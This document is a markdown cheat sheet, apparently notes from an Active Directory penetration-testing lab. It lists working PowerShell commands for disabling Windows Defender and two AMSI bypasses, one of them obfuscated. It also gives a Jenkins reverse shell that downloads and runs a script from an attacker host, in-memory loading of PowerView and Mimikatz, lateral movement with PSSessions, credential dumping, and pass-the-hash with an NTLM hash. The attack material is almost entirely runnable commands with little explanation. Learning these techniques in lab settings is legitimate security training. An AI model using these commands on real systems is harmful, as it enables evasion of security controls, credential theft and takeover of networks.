# Antivirus & Detections

## Windows Defender

### Check Status of Defender

- **PowerShell Commands:**
  ```powershell
  Get-MpComputerStatus
  ```

- **Firewall Status Commands:**
  ```powershell
  netsh advfirewall show domain
  netsh advfirewall show private
  netsh advfirewall show public
  ```

### Disable Real-Time Monitoring

- **PowerShell Command:**
  ```powershell
  Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
  ```

- **Disable IOAV Protection:**
  ```powershell
  Set-MpPreference -DisableIOAVProtection $true
  ```

---

## AppLocker Enumeration

### With the GPO

- Registry Key Location: 
  ```
  HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2
  ```
  - Keys: `Appx`, `Dll`, `Exe`, `Msi`, and `Script`.

### List AppLocker Rules

- **PowerShell Command:**
  ```powershell
  $a = Get-ApplockerPolicy -effective
  $a.rulecollections
  ```

---

## PowerShell

### Default PowerShell Locations in a Windows System

- `C:\windows\syswow64\windowspowershell\v1.0\powershell`
- `C:\Windows\System32\WindowsPowerShell\v1.0\powershell`

### Example of AMSI Bypass

- **PowerShell Command:**
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
  ```

---

## Default Writeable Folders
```
- `C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
- `C:\Windows\System32\spool\drivers\color`
- `C:\Windows\Tasks`
- `C:\windows\tracing`
```

# Jenkins Shell Compromise

## Reverse Shell from Jenkins
```powershell
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.157/re_shell.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.157 -Port 443
```

## Bypass Anti-Virus
```powershell
sET-ItEM ('V'+'aR' + 'IA' + 'blE:1q2' + 'uZx') ([TYpE]("{1}{0}" -f 'F','rE'));(GeT-VariaBle("1Q2U"+"zX") -VaL).""A`ss`Embly"".""GET`TY`Pe""((""{6}{3}{1}{4}{2}{0}{5}"" -f'Util','A','Amsi','.Management.','utomation.','s','System')).""g`etf`iElD""(("{0}{2}{1}" -f 'amsi','d','InitFaile'),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,')).""sE`T`VaLUE""(${n`ULl},${t`RuE})
```

## Load PowerView Module in Memory
```powershell
iex (iwr http://172.16.100.157/PowerView.ps1 -UseBasicParsing)
```

## Verify with PowerView Command
```powershell
get-help Invoke-UserHunter
```

## Execute Commands on Remote Machine
```powershell
PS C:\Program Files (x86)\Jenkins\workspace\project0> Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}
PS C:\Program Files (x86)\Jenkins\workspace\project0> whoami
```

## Load Mimikatz and Dump Hashes
```powershell
iex (iwr http://172.16.100.157/Invoke-Mimikatz.ps1 -UseBasicParsing)
```

## Create a New PSSession
```powershell
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

# Active Session and Dump Hashes

## Check Access and Dump Hashes
```powershell
Invoke-UserHunter -checkaccess
Find-LocalAdminAccess
```

# Confirm Local Admin Privileges
```powershell
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
iex (iwr http://172.16.100.157/Invoke-Mimikatz.ps1 -UseBasicParsing)
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
Invoke-command -ScriptBlock {Set-MpPreference -DisableIOAVProtection $true} -Session $sess
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

# Dump Hashes Using Mimikatz
```powershell
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

mimikatz(powershell) # sekurlsa::logonpasswords
```

## Pass-the-Hash with Mimikatz
```powershell
Invoke-Mimikatz -Command '""sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe""'
```
